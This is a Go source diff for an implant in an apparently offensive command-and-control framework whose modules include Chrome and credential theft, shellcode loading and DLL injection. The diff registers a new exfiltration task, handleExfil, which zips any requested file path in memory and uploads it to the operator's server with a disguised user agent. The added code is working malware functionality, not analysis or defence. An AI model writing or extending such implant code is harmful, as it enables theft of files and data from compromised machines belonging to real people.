@@ -11,6 +11,7 @@ import (
 	"github.com/carved4/carved/implant/pkg/modules/chrome"
 	"github.com/carved4/carved/implant/pkg/modules/creds"
 	"github.com/carved4/carved/implant/pkg/modules/exec"
+	"github.com/carved4/carved/implant/pkg/modules/exfil"
 	"github.com/carved4/carved/implant/pkg/modules/loader"
 	"github.com/carved4/carved/implant/pkg/modules/shellcode"
 	"github.com/carved4/carved/implant/pkg/transport"
@@ -50,6 +51,7 @@ func init() {
 	Register(proto.TaskLoadPE, handleLoadPE)
 	Register(proto.TaskInjectDLL, handleInjectDLL)
 	Register(proto.TaskBOF, handleBOF)
+	Register(proto.TaskExfil, handleExfil)
 }
 
 func success(task *proto.Task, output []byte) *proto.TaskResult {
@@ -682,4 +684,27 @@ func packBOFArgsFromStrings(args []string) []byte {
 		return nil
 	}
 	return packed
+}
+
+func handleExfil(task *proto.Task) *proto.TaskResult {
+	if len(task.Args) == 0 {
+		return fail(task, "no path specified")
+	}
+	path := task.Args[0]
+
+	// Zip the path in memory
+	zipData, err := exfil.ZipPath(path)
+	if err != nil {
+		return fail(task, "zip failed: "+err.Error())
+	}
+
+	// Generate filename for the zip
+	filename := fmt.Sprintf("exfil_%s.zip", task.ID[:8])
+
+	// POST to server
+	if err := exfil.PostExfil(Config.ServerURL, zipData, filename, transport.UserAgent); err != nil {
+		return fail(task, "upload failed: "+err.Error())
+	}
+
+	return success(task, []byte(fmt.Sprintf("exfiltrated %s (%d bytes zipped)", path, len(zipData))))
 }
